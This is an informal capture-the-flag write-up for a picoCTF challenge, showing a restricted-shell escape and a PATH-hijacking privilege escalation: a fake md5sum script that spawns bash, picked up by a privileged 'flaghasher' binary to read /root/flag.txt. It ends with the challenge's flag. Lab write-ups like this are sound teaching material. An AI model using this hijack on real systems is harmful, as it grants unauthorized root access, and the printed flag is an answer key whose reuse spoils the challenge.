okay this was really interesting.first ssh into the server

i was in a restricted shell so I checked what was available to me by inputting:

```
compgen -c | grep -E 'echo|cat|mv|cp|export|ln|sh|bash'
```

and say I had bash and then inputted

```
bash
```

okay then I had to make md5sum allow me to run commands so I input the following:

```
echo -e '#!/bin/bash\n/bin/bash' > md5sum
chmod +x md5sum
export PATH=.:$PATH
flaghasher
```

and finally I inputted:

```
cat /root/flag.txt
```

picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_6e3b0209}
